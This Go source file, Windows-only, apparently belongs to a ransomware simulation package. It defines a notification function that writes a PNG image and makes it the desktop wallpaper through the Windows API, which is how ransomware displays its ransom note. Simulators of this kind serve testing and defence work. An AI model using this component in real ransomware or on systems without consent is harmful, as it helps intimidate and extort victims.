//+build windows

package ransimware

import (
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Create image file
		if f, e = os.Create(image); e != nil {
			return e
		}

		// Write PNG to file
		f.Write(png)
		f.Close()

		// Change background with Windows API
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(image)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file
		os.Remove(image)

		return nil
	}
}
